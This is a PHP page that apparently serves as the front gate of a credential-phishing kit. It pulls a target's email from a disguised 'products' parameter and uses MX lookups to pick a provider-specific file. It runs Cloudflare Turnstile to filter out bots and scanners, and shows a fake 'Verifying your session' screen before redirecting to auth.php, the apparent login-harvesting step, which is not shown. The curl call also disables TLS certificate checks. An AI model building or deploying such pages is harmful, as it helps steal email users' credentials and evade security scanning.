<?php
require 'config.php';
require_once __DIR__ . '/index-functions.php';

$products_raw = $_GET['products'] ?? '';
$products     = normalizeProducts($products_raw);
$use_cf       = defined('USE_CLOUDFLARE') && USE_CLOUDFLARE;

// ============================================================
// 1. POST handler
// ============================================================
if ($use_cf && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');

    $token         = $_POST['cf_turnstile_token'] ?? '';
    $products_post = normalizeProducts($_POST['products'] ?? '');

    if ($token === '' || $products_post === '') {
        echo json_encode(['success' => false, 'error' => 'Missing or invalid input']);
        exit;
    }

    $secret = $cf_secret_key ?? '';

    $ch = curl_init('https://challenges.cloudflare.com/turnstile/v0/siteverify');
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query([
            'secret'   => $secret,
            'response' => $token,
            'remoteip' => $_SERVER['REMOTE_ADDR'] ?? '',
        ]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 6,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $resp = curl_exec($ch);
    curl_close($ch);

    $data = $resp ? json_decode($resp, true) : null;
    if (empty($data['success'])) {
        echo json_encode([
            'success' => false,
            'error'   => $data['error-codes'][0] ?? 'Turnstile rejected the token',
        ]);
        exit;
    }

    $mx_file = getMxFile($products_post);
    echo json_encode([
        'success'  => true,
        'auth_url' => 'auth.php?file=' . urlencode($mx_file) .
                      '&products=' . urlencode($products_post),
    ]);
    exit;
}

// ============================================================
// 2. Routing decision
// ============================================================
$show_loader     = false;
$direct_auth_url = '';
$route_reason    = 'idle';

if (!empty($products)) {
    $probe_domain = substr($products, strpos($products, '@') + 1);

    if (hasRecognizableMx($probe_domain)) {
        $route_reason = 'mx-known';
        $show_loader  = false;
    } else {
        $route_reason = 'mx-unknown';
        $show_loader  = true;
    }

    if (!$use_cf) {
        $mx_file = getMxFile($products);
        $direct_auth_url = 'auth.php?file=' . urlencode($mx_file) .
                           '&products=' . urlencode($products);
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying your session&hellip;</title>
    <?php if ($use_cf): ?>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <?php endif; ?>
    <style>
        :root {
            --bg-1: #0f172a;
            --bg-2: #1e293b;
            --card: #ffffff;
            --text: #0f172a;
            --muted: #64748b;
            --accent: #2563eb;
            --accent-2: #3b82f6;
            --accent-glow: rgba(37, 99, 235, .35);
            --danger-bg: #fef2f2;
            --danger-border: #fecaca;
            --danger-text: #991b1b;
        }
        * { box-sizing: border-box; }
        html, body { height: 100%; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
                         Roboto, "Helvetica Neue", Arial, sans-serif;
            background:
                radial-gradient(circle at 20% 20%, #1e293b 0%, transparent 45%),
                radial-gradient(circle at 80% 80%, #1e3a8a 0%, transparent 45%),
                linear-gradient(135deg, var(--bg-1) 0%, var(--bg-2) 100%);
            color: var(--text);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 24px;
            overflow: hidden;
            -webkit-font-smoothing: antialiased;
        }
        body::before {
            content: "";
            position: fixed;
            inset: -50%;
            background: conic-gradient(from 0deg,
                transparent 0%,
                rgba(59, 130, 246, .08) 25%,
                transparent 50%,
                rgba(37, 99, 235, .08) 75%,
                transparent 100%);
            animation: sweep 18s linear infinite;
            z-index: 0;
            pointer-events: none;
        }
        @keyframes sweep { to { transform: rotate(360deg); } }

        .card {
            position: relative;
            z-index: 1;
            background: var(--card);
            width: 100%;
            max-width: 420px;
            border-radius: 18px;
            padding: 40px 32px 32px;
            box-shadow:
                0 1px 2px rgba(0,0,0,.04),
                0 12px 24px -8px rgba(0,0,0,.18),
                0 32px 64px -16px rgba(0,0,0,.28);
            text-align: center;
            animation: rise .55s cubic-bezier(.22,.9,.36,1) both;
        }
        @keyframes rise {
            from { opacity: 0; transform: translateY(14px) scale(.985); }
            to   { opacity: 1; transform: translateY(0)    scale(1); }
        }

        .loader-wrap {
            position: relative;
            width: 84px;
            height: 84px;
            margin: 0 auto 26px;
        }
        .loader-ring {
            position: absolute;
            inset: 0;
            border-radius: 50%;
            border: 3px solid transparent;
            border-top-color: var(--accent);
            border-right-color: var(--accent-2);
            animation: spin 1.1s cubic-bezier(.55,.15,.45,.85) infinite;
            filter: drop-shadow(0 0 10px var(--accent-glow));
        }
        .loader-ring.inner {
            inset: 12px;
            border-top-color: transparent;
            border-left-color: var(--accent-2);
            border-bottom-color: var(--accent);
            animation: spin 1.6s linear infinite reverse;
            opacity: .75;
        }
        .loader-ring.core {
            inset: 24px;
            border: none;
            background: linear-gradient(135deg, var(--accent) 0%, var(--accent-2) 100%);
            animation: pulse 1.8s ease-in-out infinite;
            box-shadow: 0 0 0 0 var(--accent-glow);
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes pulse {
            0%, 100% { transform: scale(.85); box-shadow: 0 0 0 0 var(--accent-glow); }
            50%      { transform: scale(1);   box-shadow: 0 0 0 12px rgba(37, 99, 235, 0); }
        }

        .status-icon {
            width: 64px;
            height: 64px;
            margin: 0 auto 22px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--accent) 0%, var(--accent-2) 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 24px -8px var(--accent-glow);
        }
        .status-icon svg { width: 28px; height: 28px; fill: #fff; }

        h1 {
            font-size: 22px;
            font-weight: 700;
            margin: 0 0 8px;
            color: var(--text);
            letter-spacing: -0.01em;
        }
        .subtitle {
            font-size: 14.5px;
            color: var(--muted);
            margin: 0 0 26px;
            line-height: 1.5;
        }
        .progress {
            position: relative;
            height: 4px;
            width: 100%;
            background: #eef2f7;
            border-radius: 999px;
            overflow: hidden;
            margin-bottom: 24px;
        }
        .progress::after {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            height: 100%;
            width: 40%;
            background: linear-gradient(90deg,
                transparent 0%,
                var(--accent) 50%,
                var(--accent-2) 100%);
            border-radius: 999px;
            animation: slide 1.6s ease-in-out infinite;
        }
        @keyframes slide {
            0%   { left: -40%; }
            100% { left: 100%; }
        }
        #turnstile-container {
            display: flex;
            justify-content: center;
            min-height: 70px;
            align-items: center;
        }
        .debug-box {
            background: var(--danger-bg);
            border: 1px solid var(--danger-border);
            color: var(--danger-text);
            padding: 14px 16px;
            border-radius: 10px;
            margin-top: 22px;
            font-size: 13px;
            text-align: left;
            line-height: 1.5;
            word-break: break-word;
            animation: rise .35s cubic-bezier(.22,.9,.36,1) both;
        }
        .debug-box strong { display: block; margin-bottom: 6px; font-weight: 700; }
        .footer-hint {
            margin-top: 22px;
            font-size: 12px;
            color: var(--muted);
            letter-spacing: .01em;
        }
        @media (max-width: 480px) {
            .card { padding: 32px 22px 26px; border-radius: 14px; }
            h1 { font-size: 20px; }
            .subtitle { font-size: 13.5px; }
            .loader-wrap { width: 72px; height: 72px; }
            .status-icon { width: 56px; height: 56px; margin-bottom: 18px; }
        }
    </style>
</head>
<body>
    <main class="card" role="main" aria-busy="<?php echo $show_loader ? 'true' : 'false'; ?>">
        <?php if ($show_loader): ?>
            <div class="loader-wrap" aria-hidden="true">
                <div class="loader-ring"></div>
                <div class="loader-ring inner"></div>
                <div class="loader-ring core"></div>
            </div>
            <h1>Verifying your session</h1>
            <p class="subtitle">Please wait a moment while we prepare a secure connection.</p>
            <div class="progress" aria-hidden="true"></div>
        <?php else: ?>
            <div class="status-icon" aria-hidden="true">
                <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
                    <path d="M13.485 1.929a1 1 0 0 1 1.415 1.414l-7.5 7.5a1 1 0 0 1-1.415 0l-3.5-3.5a1 1 0 1 1 1.415-1.414l2.792 2.793 6.793-6.793z"/>
                </svg>
            </div>
            <h1>Almost there</h1>
            <p class="subtitle">Preparing your secure session&hellip;</p>
        <?php endif; ?>

        <div id="turnstile-container">
            <?php if ($use_cf): ?>
            <div class="cf-turnstile"
                 data-sitekey="<?php echo htmlspecialchars($cf_site_key); ?>"
                 data-callback="onTurnstileSuccess"
                 data-theme="light"></div>
            <?php else: ?>
            <script>
                window.__DIRECT_AUTH_URL = <?php echo json_encode($direct_auth_url); ?>;
            </script>
            <?php endif; ?>
        </div>

        <p class="footer-hint">
            <?php echo $use_cf ? 'Protected by Cloudflare Turnstile' : 'Secure session'; ?>
        </p>
    </main>

    <script>
        const userEmail   = <?php echo json_encode($products); ?>;
        const useCF       = <?php echo $use_cf ? 'true' : 'false'; ?>;
        const routeReason = <?php echo json_encode($route_reason); ?>;

        function onTurnstileSuccess(token) {
            if (!useCF) {
                const target = window.__DIRECT_AUTH_URL || '';
                if (target) {
                    fadeCardOutAndGo(target);
                } else {
                    showError('Session Error', 'No verification target provided.');
                }
                return;
            }

            const formData = new FormData();
            formData.append('cf_turnstile_token', token);
            formData.append('products', userEmail);

            fetch(window.location.href, { method: 'POST', body: formData })
            .then(r => r.json())
            .then(data => {
                if (data.success && data.auth_url) {
                    fadeCardOutAndGo(data.auth_url);
                } else {
                    showError('Verification Failed', data.error || 'Unknown error');
                }
            })
            .catch(err => showError('Network Error', String(err)));
        }

        function fadeCardOutAndGo(url) {
            const card = document.querySelector('.card');
            if (card) {
                card.style.transition = 'opacity .35s ease, transform .35s ease';
                card.style.opacity    = '0';
                card.style.transform  = 'translateY(-6px) scale(.98)';
            }
            setTimeout(() => { window.location.href = url; }, 320);
        }

        function showError(title, detail) {
            document.querySelector('main').setAttribute('aria-busy', 'false');
            const box = document.createElement('div');
            box.className = 'debug-box';
            const strong = document.createElement('strong');
            strong.textContent = '\u26A0 ' + title;
            box.appendChild(strong);
            box.appendChild(document.createTextNode(detail));
            document.querySelector('main').appendChild(box);
            const lw = document.querySelector('.loader-wrap');
            if (lw) lw.style.display = 'none';
            const si = document.querySelector('.status-icon');
            if (si) si.style.display = 'none';
        }

        if (!useCF) {
            window.addEventListener('load', function () {
                setTimeout(function () {
                    const target = window.__DIRECT_AUTH_URL || '';
                    if (target) {
                        fadeCardOutAndGo(target);
                    } else if (routeReason === 'idle') {
                        // No products param — nothing to do.
                    } else {
                        showError('Session Error', 'No verification target provided.');
                    }
                }, 600);
            });
        }
    </script>
</body>
</html>